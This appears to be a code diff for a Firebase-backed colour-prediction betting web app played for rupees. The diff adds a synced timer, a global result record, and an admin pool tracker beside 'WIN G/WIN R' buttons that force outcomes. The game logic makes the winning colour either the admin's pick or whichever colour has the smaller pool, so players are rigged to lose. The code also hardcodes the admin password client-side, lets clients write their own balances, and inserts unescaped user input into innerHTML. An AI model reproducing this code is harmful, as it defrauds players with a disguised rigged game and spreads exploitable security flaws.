@@ -66,7 +66,9 @@
 
 <div id="adminM" class="modal"><div class="modal-content">
     <h2 style="color:var(--accent);">ADMIN DASHBOARD</h2>
-    <div id="poolInfo" style="background:#000; padding:10px; color:var(--green); margin-bottom:15px;"></div>
+    <div id="poolDisplay" style="background:#000; padding:10px; color:var(--green); margin-bottom:15px; font-weight:bold;">
+        Green: ₹<span id="pG">0</span> | Red: ₹<span id="pR">0</span>
+    </div>
     <div style="display:flex; gap:10px; margin-bottom:15px;">
         <button onclick="setManual('Green')" style="flex:1; background:var(--green); padding:10px; border-radius:8px; font-weight:bold;">WIN G</button>
         <button onclick="setManual('Red')" style="flex:1; background:var(--red); padding:10px; border-radius:8px; font-weight:bold; color:#fff;">WIN R</button>
@@ -126,10 +128,9 @@
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // FIX: Data persistence on refresh
     let uid = localStorage.getItem('CLUB_USER_ID_v99') || ("ID"+Math.floor(1000+Math.random()*8999));
     localStorage.setItem('CLUB_USER_ID_v99', uid);
-    let bal = 0, currentBetCol = '', taps = 0;
+    let bal = 0, currentBetCol = '', taps = 0, lastProcessedPeriod = 0;
 
     db.ref('users/' + uid).on('value', s => {
         let d = s.val(); if(!d) db.ref('users/'+uid).set({balance:0, id:uid});
@@ -138,45 +139,67 @@
         document.getElementById('uID').innerText = "ID: " + uid;
     });
 
+    // SYNCED TIMER LOGIC
     setInterval(() => {
-        let n = new Date(), s = 60 - n.getSeconds();
-        let p = Math.floor(n.getTime()/60000);
+        let n = Date.now();
+        let s = 60 - Math.floor((n / 1000) % 60);
+        let p = Math.floor(n / 60000);
         document.getElementById('timer').innerText = "00:" + (s < 10 ? "0"+s : s);
         document.getElementById('period').innerText = p;
-        if(s === 1) processGame(p);
+
+        if(s === 1 && lastProcessedPeriod !== p) {
+            lastProcessedPeriod = p;
+            processGameSync(p);
+        }
     }, 1000);
 
     function openBet(c) { currentBetCol = c; document.getElementById('selColor').innerText = "Join " + c; openM('betM'); }
+    
     function confirmBet() {
         let a = parseFloat(document.getElementById('betAmt').value);
         let p = document.getElementById('period').innerText;
         if(a >= 10 && bal >= a) {
             db.ref('users/'+uid).update({ balance: bal - a });
             db.ref('active_bets/'+p+'/'+uid).push({ color: currentBetCol, amount: a });
-            db.ref('history/'+uid+'/'+p).set({ color: 'Pending', status: 'Pending', amount: a });
+            db.ref('history/'+uid+'/'+p).set({ bet: currentBetCol, status: 'Pending', amount: a });
             closeM('betM');
         } else alert("Balance Low!");
     }
 
-    function processGame(p) {
-        db.ref('active_bets/'+p).once('value', snap => {
-            db.ref('admin/manual').once('value', ms => {
-                let pool = { Green: 0, Red: 0 };
-                if(snap.exists()) snap.forEach(u => u.forEach(b => pool[b.val().color] += b.val().amount));
-                let win = ms.val() || (pool.Green <= pool.Red ? 'Green' : 'Red');
-
-                if(snap.exists()) {
-                    snap.forEach(userNode => {
-                        let uKey = userNode.key, winAmt = 0;
-                        userNode.forEach(bet => { if(bet.val().color === win) winAmt += (bet.val().amount * 1.9); });
-                        if(winAmt > 0) db.ref('users/'+uKey+'/balance').transaction(c => (c||0) + winAmt);
-                        db.ref('history/'+uKey+'/'+p).update({ status: winAmt > 0 ? 'Win' : 'Loss', color: win, res: win });
-                        if(uKey === uid) setTimeout(() => showFinalPopup(winAmt > 0 ? 'Win' : 'Loss', winAmt, win), 1500);
+    function processGameSync(p) {
+        // Only check global result once
+        db.ref('global_result/'+p).on('value', snap => {
+            if(snap.exists()) {
+                let winColor = snap.val().win;
+                handleUserResult(p, winColor);
+            } else {
+                // Determine Winner (Admin choice or Low Pool)
+                db.ref('admin/manual').once('value', ms => {
+                    db.ref('active_bets/'+p).once('value', betSnap => {
+                        let pool = { Green: 0, Red: 0 };
+                        betSnap.forEach(u => u.forEach(b => pool[b.val().color] += b.val().amount));
+                        
+                        let win = ms.val() || (pool.Green <= pool.Red ? 'Green' : 'Red');
+                        
+                        db.ref('global_result/'+p).set({ win: win });
+                        db.ref('trends').push({ color: win === 'Red' ? '#ff5252' : '#00e676' });
+                        db.ref('admin/manual').set(null);
                     });
-                }
-                db.ref('trends').push({ color: win === 'Red' ? '#ff5252' : '#00e676' });
-                db.ref('admin/manual').set(null);
-            });
+                });
+            }
+        });
+    }
+
+    function handleUserResult(p, win) {
+        db.ref('active_bets/'+p+'/'+uid).once('value', s => {
+            if(s.exists()){
+                let winAmt = 0;
+                s.forEach(bet => { if(bet.val().color === win) winAmt += (bet.val().amount * 1.9); });
+                if(winAmt > 0) db.ref('users/'+uid+'/balance').transaction(c => (c||0) + winAmt);
+                
+                db.ref('history/'+uid+'/'+p).update({ status: winAmt > 0 ? 'Win' : 'Loss', res: win });
+                showFinalPopup(winAmt > 0 ? 'Win' : 'Loss', winAmt, win);
+            }
         });
     }
 
@@ -188,6 +211,30 @@
         body.innerHTML = `Result: ${clr}<br>${st === 'Win' ? 'Won: ₹'+amt.toFixed(2) : 'Better luck next time!'}`;
         openM('resultM');
     }
+
+    // ADMIN POOL TRACKER
+    function loadAdmin() {
+        let p = document.getElementById('period').innerText;
+        db.ref('active_bets/'+p).on('value', snap => {
+            let pool = { Green: 0, Red: 0 };
+            snap.forEach(u => u.forEach(b => pool[b.val().color] += b.val().amount));
+            document.getElementById('pG').innerText = pool.Green;
+            document.getElementById('pR').innerText = pool.Red;
+        });
+        // Rest of admin logic...
+        db.ref('requests').on('value', s => {
+            let html = "";
+            s.forEach(r => {
+                let d = r.val();
+                html += `<tr><td>${d.uid}</td><td>₹${d.amt}</td><td>${d.info}</td>
+                <td><button class="appr-btn" onclick="apprReq('${r.key}','${d.uid}',${d.amt},'${d.type}')">✔</button>
+                <button class="rejt-btn" onclick="rejReq('${r.key}')">✖</button></td></tr>`;
+            });
+            document.getElementById('adminReqsBody').innerHTML = html || "<tr><td colspan='4'>No Requests</td></tr>";
+        });
+    }
+
+    function setManual(c) { db.ref('admin/manual').set(c); alert("Next Win Force: " + c); }
 
     function drawQR() {
         let a = document.getElementById('dAmt').value;
@@ -215,25 +262,16 @@
     }
 
     function adminGo() { taps++; if(taps >= 5) { if(prompt("Pass:") === "77759636477") { openM('adminM'); loadAdmin(); } taps = 0; } }
-    function loadAdmin() {
-        db.ref('requests').on('value', s => {
-            let html = "";
-            s.forEach(r => {
-                let d = r.val();
-                html += `<tr><td>${d.uid}</td><td>₹${d.amt}</td><td>${d.info}</td>
-                <td><button class="appr-btn" onclick="apprReq('${r.key}','${d.uid}',${d.amt},'${d.type}')">✔</button>
-                <button class="rejt-btn" onclick="rejReq('${r.key}')">✖</button></td></tr>`;
-            });
-            document.getElementById('adminReqsBody').innerHTML = html || "<tr><td colspan='4'>No Requests</td></tr>";
-        });
-    }
     function apprReq(k, u, a, t) { if(t === 'Deposit') db.ref('users/'+u+'/balance').transaction(c => (c||0) + parseFloat(a)); db.ref('requests/'+k).remove(); alert("Done!"); }
     function rejReq(k) { db.ref('requests/'+k).remove(); }
-    function setManual(c) { db.ref('admin/manual').set(c); alert("Next Win: " + c); }
 
     db.ref('history/'+uid).limitToLast(10).on('value', s => {
-        let h = "<table><tr><th>Period</th><th>Res</th><th>Status</th></tr>";
-        s.forEach(x => { let v = x.val(); h += `<tr><td>${x.key}</td><td>${v.color || '-'}</td><td style="color:${v.status=='Win'?'#00e676':'#ff5252'}">${v.status}</td></tr>`; });
+        let h = "<table><tr><th>Period</th><th>Bet</th><th>Res</th><th>Status</th></tr>";
+        s.forEach(x => { 
+            let v = x.val(); 
+            let sCol = v.status === 'Win' ? '#00e676' : (v.status === 'Loss' ? '#ff5252' : '#fff');
+            h += `<tr><td>${x.key}</td><td>${v.bet}</td><td>${v.res || '-'}</td><td style="color:${sCol}">${v.status}</td></tr>`; 
+        });
         document.getElementById('betHistory').innerHTML = h + "</table>";
     });
 
